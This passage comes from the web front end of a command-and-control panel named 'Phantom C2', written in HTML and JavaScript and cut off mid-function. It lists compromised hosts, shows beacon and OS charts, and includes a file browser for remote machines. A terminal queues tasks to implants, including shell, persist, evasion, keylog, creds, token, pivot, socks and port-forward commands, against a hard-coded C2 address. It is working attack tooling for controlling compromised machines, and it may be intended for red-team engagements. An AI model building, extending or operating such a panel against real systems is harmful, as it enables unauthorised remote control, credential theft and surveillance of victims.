            <textarea id="engagement-notes-text" placeholder="Document findings, observations, next steps..." onchange="saveEngagementNotes()" style="width:100%;min-height:300px;padding:12px;background:var(--bg-input);border:1px solid var(--border);border-radius:var(--radius);color:var(--text-primary);font-size:13px;font-family:monospace;resize:vertical;line-height:1.6"></textarea>
            <div style="font-size:10px;color:var(--text-muted);margin-top:4px">Auto-saved to browser localStorage</div>
          </div>
        </div>
      </div>
    </div>

  </div>
</div>

<script>
// ──── State ────
let cmdHistory = [], historyIdx = -1;

// ──── Navigation ────
function nav(page) {
  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
  document.getElementById('p-' + page).classList.add('active');
  document.querySelectorAll('.sidebar-btn').forEach(b => b.classList.remove('active'));
  // Find the clicked sidebar button and activate it
  const btn = event ? event.target.closest('.sidebar-btn') : null;
  if (btn) btn.classList.add('active');
  if (page === 'terminal') document.getElementById('term-input').focus();
}

// ──── Helpers ────
function badge(s) {
  const m = {'active':'b-active','running':'b-running','complete':'b-complete','dormant':'b-dormant','pending':'b-pending','sent':'b-sent','dead':'b-dead','stopped':'b-stopped','error':'b-error'};
  const dot = ['active','dormant','dead'].includes(s) ? '<span class="badge-dot"></span>' : '';
  return '<span class="badge '+(m[s]||'b-pending')+'">'+dot+s+'</span>';
}
function osIcon(os) { return os==='windows'?'🪟':os==='linux'?'🐧':os==='android'?'📱':os==='ios'?'🍎':'💻'; }
async function fetchJ(u) { try { return await (await fetch(u)).json(); } catch(e) { return []; } }

// ──── Data Refresh ────
async function refreshAll() {
  const agents = await fetchJ('/api/agents');
  const listeners = await fetchJ('/api/listeners');
  window._cachedListeners = listeners;
  const tasks = await fetchJ('/api/tasks');
  const events = await fetchJ('/api/events') || [];

  const activeAgents = agents.filter(a => a.status==='active').length;

  // Stats
  document.getElementById('s-agents').textContent = activeAgents;
  document.getElementById('s-agents-sub').textContent = agents.length + ' total, ' + activeAgents + ' active';
  document.getElementById('s-listeners').textContent = listeners.filter(l=>l.status==='running').length;
  document.getElementById('s-listeners-sub').textContent = listeners.length + ' configured';
  const completedTasks = tasks.filter(t=>t.status==='complete').length;
  document.getElementById('s-tasks').textContent = completedTasks;
  document.getElementById('s-tasks-sub').textContent = tasks.length + ' total';
  document.getElementById('s-events').textContent = events.length;
  document.getElementById('s-events-sub').textContent = events.length > 0 ? 'Latest activity tracked' : '—';

  // Agent badge count + notification
  const sbBadge = document.getElementById('sb-agents');
  if (activeAgents > 0) { sbBadge.style.display='flex'; sbBadge.textContent=activeAgents; }
  else { sbBadge.style.display='none'; }
  if (activeAgents > lastAgentCount && lastAgentCount > 0) {
    const newAgent = agents.find(a => a.status === 'active');
    if (newAgent) notifyNewAgent(newAgent.name, newAgent.hostname);
  }
  lastAgentCount = activeAgents;

  // Dashboard agents (card view)
  const wrap = document.getElementById('dash-agents-wrap');
  if (agents.length > 0) {
    wrap.innerHTML = '<div class="agent-grid">' + agents.map(a =>
      '<div class="agent-card" onclick="selectAgent(\''+a.name+'\')">' +
      '<div class="agent-top"><div><div class="agent-name">'+a.name+' <span onclick="event.stopPropagation();renameAgent(\''+a.name+'\')" style="font-size:10px;cursor:pointer;color:var(--text-muted);margin-left:4px" title="Rename">✏️</span></div>' +
      '<div class="agent-os">'+osIcon(a.os)+' '+a.os+'</div></div>' +
      badge(a.status) + '</div>' +
      '<div class="agent-details">' +
      '<div class="agent-detail"><div class="agent-detail-label">Host</div><div class="agent-detail-value">'+a.hostname+'</div></div>' +
      '<div class="agent-detail"><div class="agent-detail-label">User</div><div class="agent-detail-value">'+a.username+'</div></div>' +
      '<div class="agent-detail"><div class="agent-detail-label">IP</div><div class="agent-detail-value">'+a.ip+'</div></div>' +
      '<div class="agent-detail"><div class="agent-detail-label">Last Seen</div><div class="agent-detail-value">'+a.last_seen+'</div></div>' +
      '</div></div>'
    ).join('') + '</div>';
  } else {
    wrap.innerHTML = '<div class="empty"><div class="empty-icon">📡</div><div class="empty-text">Waiting for agents...</div><div class="empty-sub">Deploy an agent to get started</div></div>';
  }

  // All agents table
  document.getElementById('all-agents').innerHTML = agents.map(a => {
    const actions = '<button class="qbtn" onclick="selectAgent(\''+a.name+'\')" style="margin-right:4px">Interact</button>' +
      (a.status === 'dead' ? '<button class="qbtn" onclick="removeAgent(\''+a.id+'\')" style="color:var(--red);font-size:11px" title="Remove dead agent">Remove</button>' : '');
    return '<tr><td><input type="checkbox" class="bulk-cb" data-agent="'+a.name+'" data-id="'+a.id+'" data-status="'+a.status+'"></td><td><strong style="color:var(--accent-light)">'+a.name+' <span onclick="renameAgent(\''+a.name+'\')" style="font-size:10px;cursor:pointer;color:var(--text-muted)" title="Rename">✏️</span></strong></td><td>'+osIcon(a.os)+' '+a.os+'</td><td>'+a.hostname+'</td><td>'+a.username+'</td><td style="font-family:monospace">'+a.ip+'</td><td>'+a.sleep+'</td><td>'+a.last_seen+'</td><td>'+badge(a.status)+'</td><td>'+actions+'</td></tr>';
  }).join('') || '<tr><td colspan="10" class="empty">No agents</td></tr>';

  // Listeners
  document.getElementById('all-listeners').innerHTML = listeners.map(l => {
    const actions = l.status === 'running'
      ? '<button class="qbtn" onclick="stopListener(\''+l.name+'\')" style="padding:4px 10px;font-size:11px;background:rgba(239,68,68,0.15);color:#ef4444;">⏹ Stop</button>'
      : '<button class="qbtn" onclick="startListener(\''+l.name+'\')" style="padding:4px 10px;font-size:11px;background:rgba(16,185,129,0.15);color:#10b981;">▶ Start</button>';
    return '<tr><td style="font-weight:600">'+l.name+'</td><td>'+l.type+'</td><td style="font-family:monospace">'+l.bind+'</td><td>'+badge(l.status)+'</td><td>'+actions+'</td></tr>';
  }).join('');
  loadPresets();

  // Dashboard tasks
  document.getElementById('dash-tasks').innerHTML = tasks.slice(0,8).map(t =>
    '<tr><td style="color:var(--accent-light);font-weight:500">'+t.agent+'</td><td>'+t.type+'</td><td><code style="color:var(--cyan)">'+((t.args||'').substring(0,40)||'—')+'</code></td><td>'+badge(t.status)+'</td><td style="color:var(--text-muted)">'+t.time+'</td></tr>'
  ).join('') || '<tr><td colspan="5" class="empty">No tasks yet</td></tr>';

  // All tasks
  document.getElementById('all-tasks').innerHTML = tasks.map(t =>
    '<tr><td style="font-family:monospace;font-size:11px">'+t.id+'</td><td style="color:var(--accent-light)">'+t.agent+'</td><td>'+t.type+'</td><td><code style="color:var(--cyan)">'+((t.args||'').substring(0,30)||'—')+'</code></td><td>'+badge(t.status)+'</td><td style="color:var(--text-muted)">'+t.time+'</td><td style="max-width:250px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;font-family:monospace;font-size:11px;color:var(--text-muted)">'+(t.output||'—')+'</td></tr>'
  ).join('');

  // Agent selector
  const sel = document.getElementById('agent-select');
  const cur = sel.value;
  sel.innerHTML = '<option value="">Select an agent...</option>' + agents.map(a =>
    '<option value="'+a.name+'" '+(a.name===cur?'selected':'')+'>'+osIcon(a.os)+' '+a.name+' — '+a.hostname+'</option>'
  ).join('');

  // Events
  if (events.length > 0) {
    document.getElementById('event-log').innerHTML = events.map(e =>
      '<div class="event-item">'+e+'</div>'
    ).join('');
  }
}

// ──── Agent Selection ────
function selectAgent(name) {
  document.getElementById('agent-select').value = name;
  onAgentSelect();
  nav('terminal');
}

function onAgentSelect() {
  const name = document.getElementById('agent-select').value;
  if (name) {
    document.getElementById('term-prompt').innerHTML = 'phantom [<span style="color:var(--cyan)">'+name+'</span>] &gt;';
    document.getElementById('term-title').textContent = 'Phantom C2 — ' + name;
    termLog('info', '✓ Interacting with ' + name);
  }
}

// ──── Terminal ────
function termLog(type, text) {
  const body = document.getElementById('term-body');
  const div = document.createElement('div');
  div.className = 'term-' + (type || 'output');
  if (type === 'output' || type === 'success') {
    div.innerHTML = colorizeOutput(text);
  } else {
    div.textContent = text;
  }
  body.appendChild(div);
  body.scrollTop = body.scrollHeight;
}

async function sendTermCmd() {
  const input = document.getElementById('term-input');
  const raw = input.value.trim();
  input.value = '';
  if (!raw) return;

  const agent = document.getElementById('agent-select').value;
  if (!agent) { termLog('error', '✗ No agent selected'); return; }

  cmdHistory.push(raw); historyIdx = cmdHistory.length;
  termLog('line', '❯ ' + raw);

  const parts = raw.split(/\s+/);
  let cmd = parts[0].toLowerCase(), args = parts.slice(1).join(' ');

  if (['shell','exec','cmd'].includes(cmd)) { cmd = 'shell'; }
  else if (!['sysinfo','ps','screenshot','download','persist','sleep','cd','kill','evasion','token','keylog','socks','portfwd','creds','pivot'].includes(cmd) && !cmd.startsWith('ad-')) {
    args = raw; cmd = 'shell';
  }

  try {
    const resp = await fetch('/api/cmd', { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({agent,command:cmd,args}) });
    const data = await resp.json();
    if (data.error) { termLog('error', '✗ ' + data.error); }
    else { termLog('info', '⏳ Task queued: ' + data.type + ' (' + data.task_id.substring(0,8) + ')'); pollResult(data.task_id, agent); }
  } catch(e) { termLog('error', '✗ ' + e.message); }
}

async function pollResult(taskId, agentName) {
  for (let i = 0; i < 30; i++) {
    await new Promise(r => setTimeout(r, 2000));
    try {
      const detail = await fetchJ('/api/agent/' + agentName);
      if (detail.tasks) {
        const task = detail.tasks.find(t => taskId.startsWith(t.id) || t.id === taskId.substring(0,8));
        if (task && (task.output || task.error) && !['pending','sent'].includes(task.status)) {
          if (task.error) { termLog('error', task.error); }
          else { termLog('output', task.output); }
          return;
        }
      }
    } catch(e) {}
  }
  termLog('info', '⏳ Timeout — check Tasks page');
}

function quickCmd(cmd) { const a=document.getElementById('agent-select').value; if(!a){nav('terminal');termLog('error','✗ No agent selected');return;} nav('terminal'); document.getElementById('term-input').value=cmd; sendTermCmd(); }
function sendShell(cmd) { const a=document.getElementById('agent-select').value; if(!a){nav('terminal');termLog('error','✗ No agent selected');return;} nav('terminal'); document.getElementById('term-input').value='shell '+cmd; sendTermCmd(); }

document.getElementById('term-input').addEventListener('keydown', function(e) {
  if (e.key==='ArrowUp' && cmdHistory.length>0) { historyIdx=Math.max(0,historyIdx-1); this.value=cmdHistory[historyIdx]||''; e.preventDefault(); }
  else if (e.key==='ArrowDown') { historyIdx=Math.min(cmdHistory.length,historyIdx+1); this.value=cmdHistory[historyIdx]||''; e.preventDefault(); }
});

// ──── Charts ────
let beaconHistory = [];

function drawBeaconChart(agents) {
  const canvas = document.getElementById('beacon-chart');
  if (!canvas) return;
  const ctx = canvas.getContext('2d');
  const w = canvas.width = canvas.parentElement.clientWidth;
  const h = canvas.height = 140;

  // Track check-ins over time
  const now = Date.now();
  beaconHistory.push({ time: now, count: agents.filter(a=>a.status==='active').length });
  if (beaconHistory.length > 60) beaconHistory.shift();

  ctx.clearRect(0, 0, w, h);

  // Grid lines
  ctx.strokeStyle = 'rgba(42,48,80,0.4)';
  ctx.lineWidth = 1;
  for (let i = 0; i < 5; i++) {
    const y = (h / 5) * i + 10;
    ctx.beginPath(); ctx.moveTo(40, y); ctx.lineTo(w - 10, y); ctx.stroke();
  }

  if (beaconHistory.length < 2) return;

  const maxVal = Math.max(...beaconHistory.map(b=>b.count), 1);
  const stepX = (w - 50) / (beaconHistory.length - 1);

  // Gradient fill
  const grad = ctx.createLinearGradient(0, 0, 0, h);
  grad.addColorStop(0, 'rgba(124,58,237,0.3)');
  grad.addColorStop(1, 'rgba(124,58,237,0)');

  ctx.beginPath();
  ctx.moveTo(40, h - 10);
  beaconHistory.forEach((b, i) => {
    const x = 40 + i * stepX;
    const y = h - 10 - ((b.count / maxVal) * (h - 30));
    if (i === 0) ctx.lineTo(x, y);
    else ctx.lineTo(x, y);
  });
  ctx.lineTo(40 + (beaconHistory.length - 1) * stepX, h - 10);
  ctx.closePath();
  ctx.fillStyle = grad;
  ctx.fill();

  // Line
  ctx.beginPath();
  beaconHistory.forEach((b, i) => {
    const x = 40 + i * stepX;
    const y = h - 10 - ((b.count / maxVal) * (h - 30));
    if (i === 0) ctx.moveTo(x, y);
    else ctx.lineTo(x, y);
  });
  ctx.strokeStyle = '#7c3aed';
  ctx.lineWidth = 2;
  ctx.stroke();

  // Dots on line
  beaconHistory.forEach((b, i) => {
    if (i % 5 === 0 || i === beaconHistory.length - 1) {
      const x = 40 + i * stepX;
      const y = h - 10 - ((b.count / maxVal) * (h - 30));
      ctx.beginPath();
      ctx.arc(x, y, 3, 0, Math.PI * 2);
      ctx.fillStyle = '#a78bfa';
      ctx.fill();
    }
  });

  // Y-axis labels
  ctx.fillStyle = '#5a6580';
  ctx.font = '10px Inter, sans-serif';
  ctx.textAlign = 'right';
  for (let i = 0; i <= 4; i++) {
    const val = Math.round((maxVal / 4) * (4 - i));
    const y = (h / 5) * i + 14;
    ctx.fillText(val, 34, y);
  }

  // Current value label
  const lastVal = beaconHistory[beaconHistory.length - 1].count;
  const lastX = 40 + (beaconHistory.length - 1) * stepX;
  const lastY = h - 10 - ((lastVal / maxVal) * (h - 30));
  ctx.fillStyle = '#a78bfa';
  ctx.font = 'bold 11px Inter';
  ctx.textAlign = 'left';
  ctx.fillText(lastVal + ' active', lastX + 8, lastY + 4);
}

function drawOSChart(agents) {
  const canvas = document.getElementById('os-chart');
  if (!canvas) return;
  const ctx = canvas.getContext('2d');
  const w = canvas.width = canvas.parentElement.clientWidth;
  const h = canvas.height = 150;

  ctx.clearRect(0, 0, w, h);

  if (agents.length === 0) {
    ctx.fillStyle = '#5a6580';
    ctx.font = '12px Inter';
    ctx.textAlign = 'center';
    ctx.fillText('No data', w/2, h/2);
    return;
  }

  // Count by OS
  const osCounts = {};
  agents.forEach(a => { osCounts[a.os] = (osCounts[a.os] || 0) + 1; });
  const osColors = { windows: '#3b82f6', linux: '#10b981', android: '#f59e0b', ios: '#8b5cf6', mobile: '#06b6d4' };
  const osIcons = { windows: '🪟', linux: '🐧', android: '📱', ios: '🍎' };
  const entries = Object.entries(osCounts).sort((a,b) => b[1] - a[1]);
  const total = agents.length;

  // Donut chart
  const cx = w / 2, cy = 55, r = 40, rInner = 24;
  let startAngle = -Math.PI / 2;

  entries.forEach(([os, count]) => {
    const sliceAngle = (count / total) * Math.PI * 2;
    ctx.beginPath();
    ctx.arc(cx, cy, r, startAngle, startAngle + sliceAngle);
    ctx.arc(cx, cy, rInner, startAngle + sliceAngle, startAngle, true);
    ctx.closePath();
    ctx.fillStyle = osColors[os] || '#64748b';
    ctx.fill();
    startAngle += sliceAngle;
  });

  // Center text
  ctx.fillStyle = '#e8ecf4';
  ctx.font = 'bold 18px Inter';
  ctx.textAlign = 'center';
  ctx.fillText(total, cx, cy + 3);
  ctx.fillStyle = '#5a6580';
  ctx.font = '9px Inter';
  ctx.fillText('TOTAL', cx, cy + 14);

  // Legend
  let ly = 110;
  entries.forEach(([os, count]) => {
    const icon = osIcons[os] || '💻';
    const pct = Math.round((count / total) * 100);
    ctx.fillStyle = osColors[os] || '#64748b';
    ctx.beginPath();
    ctx.roundRect(10, ly - 8, 8, 8, 2);
    ctx.fill();
    ctx.fillStyle = '#8892b0';
    ctx.font = '11px Inter';
    ctx.textAlign = 'left';
    ctx.fillText(icon + ' ' + os + '  ' + count + ' (' + pct + '%)', 24, ly);
    ly += 16;
  });
}

function drawNetworkGraph(agents) {
  const canvas = document.getElementById('network-graph');
  if (!canvas) return;
  const ctx = canvas.getContext('2d');
  const dpr = window.devicePixelRatio || 1;
  const w = canvas.parentElement.clientWidth;
  const h = 320;
  canvas.width = w * dpr; canvas.height = h * dpr;
  canvas.style.width = w + 'px'; canvas.style.height = h + 'px';
  ctx.scale(dpr, dpr);
  ctx.clearRect(0, 0, w, h);

  const colors = {
    bg: '#080c16', grid: 'rgba(42,48,80,0.3)',
    c2: '#7c3aed', c2glow: 'rgba(124,58,237,0.3)',
    active: '#10b981', dead: '#ef4444', dormant: '#f59e0b',
    line: 'rgba(124,58,237,0.4)', arrow: '#a78bfa',
    text: '#8892b0', dim: '#5a6580', white: '#e8ecf4'
  };

  // Grid background
  ctx.strokeStyle = colors.grid; ctx.lineWidth = 0.5;
  for (let x = 0; x < w; x += 40) { ctx.beginPath(); ctx.moveTo(x,0); ctx.lineTo(x,h); ctx.stroke(); }
  for (let y = 0; y < h; y += 40) { ctx.beginPath(); ctx.moveTo(0,y); ctx.lineTo(w,y); ctx.stroke(); }

  // ── C2 SERVER (tower icon at top center) ──
  const sx = w/2, sy = 45;

  // Server tower
  ctx.fillStyle = colors.c2glow;
  ctx.fillRect(sx-18, sy-25, 36, 40);
  ctx.strokeStyle = colors.c2; ctx.lineWidth = 1.5;
  ctx.strokeRect(sx-18, sy-25, 36, 40);
  // Server slots
  for (let i = 0; i < 3; i++) {
    ctx.fillStyle = colors.c2;
    ctx.fillRect(sx-12, sy-20+i*12, 20, 6);
    ctx.fillStyle = i===0?colors.active:colors.arrow;
    ctx.beginPath(); ctx.arc(sx+12, sy-17+i*12, 2, 0, Math.PI*2); ctx.fill();
  }
  // Server base
  ctx.fillStyle = colors.c2; ctx.fillRect(sx-22, sy+16, 44, 4);

  // Label
  ctx.fillStyle = colors.white; ctx.font = 'bold 11px Inter'; ctx.textAlign = 'center';
  ctx.fillText('PHANTOM C2', sx, sy+35);
  ctx.fillStyle = colors.dim; ctx.font = '9px JetBrains Mono';
  ctx.fillText('172.20.41.154:8080', sx, sy+47);

  if (agents.length === 0) {
    ctx.fillStyle = colors.dim; ctx.font = '13px Inter';
    ctx.fillText('Waiting for beacons...', w/2, h/2+30);
    return;
  }

  // Group by OS
  const winAgents = agents.filter(a => a.os === 'windows');
  const linAgents = agents.filter(a => a.os !== 'windows');

  function drawComputerIcon(x, y, a) {
    const sc = a.status==='active'?colors.active:a.status==='dormant'?colors.dormant:colors.dead;
    const isWin = a.os === 'windows';

    // Connection line from C2 → agent
    ctx.beginPath(); ctx.moveTo(sx, sy+20);
    const mid = (sy+20+y-20)/2;
    ctx.bezierCurveTo(sx, mid, x, mid, x, y-20);
    ctx.strokeStyle = sc; ctx.lineWidth = 1.5; ctx.globalAlpha = 0.5;
    ctx.setLineDash([6,3]); ctx.stroke(); ctx.setLineDash([]); ctx.globalAlpha = 1;

    // Arrow head
    ctx.fillStyle = sc;
    ctx.beginPath(); ctx.moveTo(x, y-20); ctx.lineTo(x-4, y-28); ctx.lineTo(x+4, y-28); ctx.fill();

    // Monitor body
    ctx.fillStyle = a.status==='active'?'rgba(16,185,129,0.08)':'rgba(239,68,68,0.05)';
    const mw = 44, mh = 30;
    ctx.fillRect(x-mw/2, y-mh/2, mw, mh);
    ctx.strokeStyle = sc; ctx.lineWidth = 1.5;
    ctx.strokeRect(x-mw/2, y-mh/2, mw, mh);

    // Screen content
    if (isWin) {
      // Windows logo
      ctx.fillStyle = sc; ctx.globalAlpha = 0.7;
      ctx.fillRect(x-8, y-10, 7, 7); ctx.fillRect(x+1, y-10, 7, 7);
      ctx.fillRect(x-8, y-1, 7, 7); ctx.fillRect(x+1, y-1, 7, 7);
      ctx.globalAlpha = 1;
    } else {
      // Linux terminal
      ctx.fillStyle = sc; ctx.font = 'bold 10px monospace'; ctx.textAlign = 'center';
      ctx.fillText('>_', x, y+3);
    }

    // Monitor stand
    ctx.strokeStyle = sc; ctx.lineWidth = 1;
    ctx.beginPath(); ctx.moveTo(x, y+mh/2); ctx.lineTo(x, y+mh/2+6); ctx.stroke();
    ctx.beginPath(); ctx.moveTo(x-8, y+mh/2+6); ctx.lineTo(x+8, y+mh/2+6); ctx.stroke();

    // Status LED
    ctx.beginPath(); ctx.arc(x+mw/2-5, y-mh/2+5, 3, 0, Math.PI*2);
    ctx.fillStyle = sc; ctx.fill();
    if (a.status === 'active') {
      ctx.beginPath(); ctx.arc(x+mw/2-5, y-mh/2+5, 6, 0, Math.PI*2);
      ctx.fillStyle = sc.replace(')', ',0.2)').replace('rgb','rgba');
      ctx.fill();
    }

    // Hostname
    ctx.fillStyle = colors.white; ctx.font = 'bold 10px Inter'; ctx.textAlign = 'center';
    const label = a.hostname || a.name;
    ctx.fillText(label.length > 14 ? label.substring(0,12)+'..' : label, x, y+mh/2+20);

    // Username@IP
    ctx.fillStyle = colors.dim; ctx.font = '8px JetBrains Mono';
    ctx.fillText((a.username?a.username+'@':'')+a.ip, x, y+mh/2+30);

    // Agent name
    ctx.fillStyle = colors.arrow; ctx.font = '8px Inter';
    ctx.fillText(a.name, x, y+mh/2+40);

    // Status badge
    const badgeText = a.status.toUpperCase();
    const tw = ctx.measureText(badgeText).width + 8;
    ctx.fillStyle = sc.replace(')', ',0.15)').replace('rgb','rgba').replace('#','');
    // Use hex color for badge bg
    ctx.globalAlpha = 0.2; ctx.fillStyle = sc;
    ctx.fillRect(x-tw/2, y-mh/2-14, tw, 12); ctx.globalAlpha = 1;
    ctx.fillStyle = sc; ctx.font = 'bold 7px Inter';
    ctx.fillText(badgeText, x, y-mh/2-5);
  }

  // Layout: Windows agents on left, Linux on right
  const allAgents = [...winAgents, ...linAgents];
  const cols = Math.min(allAgents.length, Math.floor(w / 130));
  const rows = Math.ceil(allAgents.length / cols);
  const colW = w / (cols + 1);
  const rowH = (h - 120) / Math.max(rows, 1);
  const startY = 140;

  allAgents.forEach((a, i) => {
    const col = i % cols;
    const row = Math.floor(i / cols);
    const x = colW * (col + 1);
    const y = startY + row * rowH;
    drawComputerIcon(x, y, a);
  });

  // Legend
  ctx.globalAlpha = 0.7;
  ctx.font = '9px Inter'; ctx.textAlign = 'left';
  const ly = h - 12;
  ctx.fillStyle = colors.active; ctx.fillRect(10, ly-8, 8, 8);
  ctx.fillStyle = colors.text; ctx.fillText('Active', 22, ly);
  ctx.fillStyle = colors.dormant; ctx.fillRect(70, ly-8, 8, 8);
  ctx.fillStyle = colors.text; ctx.fillText('Dormant', 82, ly);
  ctx.fillStyle = colors.dead; ctx.fillRect(140, ly-8, 8, 8);
  ctx.fillStyle = colors.text; ctx.fillText('Dead', 152, ly);
  ctx.fillStyle = colors.arrow; ctx.fillText('─ ─ ─ Beacon Link', 200, ly);
  ctx.globalAlpha = 1;
}

function updateSessionHealth(agents) {
  const el = document.getElementById('session-health');
  if (!el) return;

  if (agents.length === 0) {
    el.innerHTML = '<div class="empty" style="padding:20px"><div class="empty-icon" style="font-size:28px">📊</div><div class="empty-sub">No sessions yet</div></div>';
    return;
  }

  const active = agents.filter(a => a.status === 'active').length;
  const dormant = agents.filter(a => a.status === 'dormant').length;
  const dead = agents.filter(a => a.status === 'dead').length;
  const total = agents.length;

  const activePct = total > 0 ? Math.round((active/total)*100) : 0;
  const dormantPct = total > 0 ? Math.round((dormant/total)*100) : 0;
  const deadPct = total > 0 ? Math.round((dead/total)*100) : 0;

  el.innerHTML =
    '<div style="margin-bottom:14px;">' +
    '<div style="display:flex;justify-content:space-between;font-size:11px;margin-bottom:4px;"><span style="color:var(--green)">Active</span><span style="color:var(--text-muted)">'+active+'/'+total+'</span></div>' +
    '<div style="height:6px;background:rgba(255,255,255,0.05);border-radius:3px;overflow:hidden;"><div style="height:100%;width:'+activePct+'%;background:var(--green);border-radius:3px;transition:width 0.5s;"></div></div></div>' +
    '<div style="margin-bottom:14px;">' +
    '<div style="display:flex;justify-content:space-between;font-size:11px;margin-bottom:4px;"><span style="color:var(--yellow)">Dormant</span><span style="color:var(--text-muted)">'+dormant+'/'+total+'</span></div>' +
    '<div style="height:6px;background:rgba(255,255,255,0.05);border-radius:3px;overflow:hidden;"><div style="height:100%;width:'+dormantPct+'%;background:var(--yellow);border-radius:3px;transition:width 0.5s;"></div></div></div>' +
    '<div>' +
    '<div style="display:flex;justify-content:space-between;font-size:11px;margin-bottom:4px;"><span style="color:var(--red)">Dead</span><span style="color:var(--text-muted)">'+dead+'/'+total+'</span></div>' +
    '<div style="height:6px;background:rgba(255,255,255,0.05);border-radius:3px;overflow:hidden;"><div style="height:100%;width:'+deadPct+'%;background:var(--red);border-radius:3px;transition:width 0.5s;"></div></div></div>';
}

// Hook charts into refresh
const _origRefresh = refreshAll;
refreshAll = async function() {
  await _origRefresh();
  const agents = await fetchJ('/api/agents');
  drawBeaconChart(agents);
  drawOSChart(agents);
  drawNetworkGraph(agents);
  updateSessionHealth(agents);
  updateFBAgentSelector(agents);
  updateUploadAgents(agents);
  updateAsmAgents(agents);
  drawHealthChart(agents);
};

// ──── Files / Screenshot / Process / Notes / Search ────

function getSelectedFBAgent() {
  const sel = document.getElementById('fb-agent');
  if (!sel.value) { alert('Select an agent first'); return null; }
  return sel.value;
}

// Track current agent OS for file browser
var fbCurrentOS = 'linux';
var fbCurrentPath = '/';

function getAgentOS(agentName) {
  if (!window._cachedAgents) return 'linux';
  const a = window._cachedAgents.find(x => x.name === agentName);
  return a ? a.os : 'linux';
}

function updateFBQuickButtons() {
  const btns = document.getElementById('fb-quick-btns');
  if (!btns) return;
  if (fbCurrentOS === 'windows') {
    btns.innerHTML = '<button class="qbtn" onclick="browseDir(\'C:\\\\\')">C:\\ (root)</button>' +
      '<button class="qbtn" onclick="browseDir(\'C:\\\\Users\')">C:\\Users</button>' +
      '<button class="qbtn" onclick="browseDir(\'C:\\\\Windows\')">C:\\Windows</button>' +
      '<button class="qbtn" onclick="browseDir(\'C:\\\\Program Files\')">Program Files</button>' +
      '<button class="qbtn" onclick="browseDir(\'C:\\\\Temp\')">C:\\Temp</button>';
    document.getElementById('fb-path').placeholder = 'C:\\';
  } else {
    btns.innerHTML = '<button class="qbtn" onclick="browseDir(\'/\')">/ (root)</button>' +
      '<button class="qbtn" onclick="browseDir(\'/home\')">home</button>' +
      '<button class="qbtn" onclick="browseDir(\'/etc\')">etc</button>' +
      '<button class="qbtn" onclick="browseDir(\'/tmp\')">tmp</button>' +
      '<button class="qbtn" onclick="browseDir(\'/var\')">var</button>' +
      '<button class="qbtn" onclick="browseDir(\'/root\')">root</button>';
    document.getElementById('fb-path').placeholder = '/';
  }
}

function fbGoUp() {
  const pathInput = document.getElementById('fb-path');
  let p = pathInput.value.trim();
  if (!p) p = fbCurrentPath;
  if (fbCurrentOS === 'windows') {
    p = p.replace(/\\+$/, '');
    const idx = p.lastIndexOf('\\');
    pathInput.value = idx > 0 ? p.substring(0, idx) : p.substring(0, 3);
  } else {
    p = p.replace(/\/+$/, '');
    const idx = p.lastIndexOf('/');
    pathInput.value = idx > 0 ? p.substring(0, idx) : '/';
  }
  browseFiles();
}

function parseDirOutput(raw, basePath) {
  // Parse Windows dir output into clickable entries
  const lines = raw.split('\n');
  let html = '';
  const sep = fbCurrentOS === 'windows' ? '\\' : '/';
  const normBase = basePath.replace(/[\\\/]+$/, '');

  for (const line of lines) {
    const trimmed = line.trim();
    if (!trimmed) { html += '\n'; continue; }

    if (fbCurrentOS === 'windows') {
      // Match: 07/06/2025  06:11 PM    <DIR>          FolderName
      const dirMatch = trimmed.match(/^(\d{2}\/\d{2}\/\d{4}\s+\d{2}:\d{2}\s+[AP]M)\s+<DIR>\s+(.+)$/);
      if (dirMatch && dirMatch[2] !== '.' && dirMatch[2] !== '..') {
        const name = dirMatch[2];
        const fullPath = normBase + sep + name;
        html += '<span style="color:var(--text-muted)">' + dirMatch[1] + '  &lt;DIR&gt;  </span>' +
          '<a href="#" onclick="browseDir(\'' + fullPath.replace(/\\/g,'\\\\').replace(/'/g,"\\'") + '\');return false;" ' +
          'style="color:var(--cyan);cursor:pointer;text-decoration:none;font-weight:600;" ' +
          'onmouseover="this.style.textDecoration=\'underline\'" onmouseout="this.style.textDecoration=\'none\'">' +
          '📁 ' + name + '</a>\n';
        continue;
      }
      // Match: file lines with size
      const fileMatch = trimmed.match(/^(\d{2}\/\d{2}\/\d{4}\s+\d{2}:\d{2}\s+[AP]M)\s+([\d,]+)\s+(.+)$/);
      if (fileMatch) {
        html += '<span style="color:var(--text-muted)">' + fileMatch[1] + '  ' + fileMatch[2].padStart(14) + '  </span>' +
          '<span style="color:var(--text-primary);">📄 ' + fileMatch[3] + '</span>\n';
        continue;
      }
    } else {
      // Parse ls -la output: drwxr-xr-x 2 root root 4096 Jan 1 12:00 dirname
      const lsMatch = trimmed.match(/^([d\-lrwxsStT]{10})\s+\d+\s+\S+\s+\S+\s+[\d,]+\s+\w+\s+\d+\s+[\d:]+\s+(.+)$/);
      if (lsMatch && lsMatch[2] !== '.' && lsMatch[2] !== '..') {
        const perms = lsMatch[1];
        const name = lsMatch[2];
        if (perms.startsWith('d')) {
          const fullPath = (normBase === '' ? '/' : normBase) + '/' + name;
          html += '<span style="color:var(--text-muted)">' + perms + '  </span>' +
            '<a href="#" onclick="browseDir(\'' + fullPath.replace(/'/g,"\\'") + '\');return false;" ' +
            'style="color:var(--cyan);cursor:pointer;text-decoration:none;font-weight:600;" ' +
            'onmouseover="this.style.textDecoration=\'underline\'" onmouseout="this.style.textDecoration=\'none\'">' +
            '📁 ' + name + '</a>\n';
          continue;
        } else if (perms.startsWith('l')) {
          html += '<span style="color:var(--text-muted)">' + perms + '  </span>' +
            '<span style="color:var(--accent-light);">🔗 ' + name + '</span>\n';
          continue;
        } else {
          html += '<span style="color:var(--text-muted)">' + perms + '  </span>' +
            '<span style="color:var(--text-primary);">📄 ' + name + '</span>\n';
          continue;
        }
      }
    }
    // Default: render line as-is (volume info, summary lines, etc.)
    html += '<span style="color:var(--text-muted)">' + trimmed.replace(/</g,'&lt;').replace(/>/g,'&gt;') + '</span>\n';
  }
  return html;
}

async function browseFiles() {
  const agent = getSelectedFBAgent(); if (!agent) return;
  fbCurrentOS = getAgentOS(agent);
  const defaultPath = fbCurrentOS === 'windows' ? 'C:\\' : '/';
  const path = document.getElementById('fb-path').value || defaultPath;
  fbCurrentPath = path;
  const output = document.getElementById('fb-output');
  output.textContent = 'Requesting directory listing...';
  const cmdLabel = fbCurrentOS === 'windows' ? 'dir ' + path : '$ ls -la ' + path;

  try {
